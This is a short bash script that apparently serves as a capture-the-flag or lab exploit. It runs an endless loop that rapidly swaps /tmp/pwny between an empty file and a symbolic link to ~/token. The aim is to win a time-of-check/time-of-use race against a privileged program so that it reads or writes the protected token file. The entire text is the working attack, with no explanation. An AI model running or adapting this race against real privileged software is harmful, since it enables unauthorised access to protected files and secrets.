OUT="/tmp/pwny"

while true; do
	echo '' > $OUT
	ln -sf ~/token $OUT
	rm -f $OUT
done
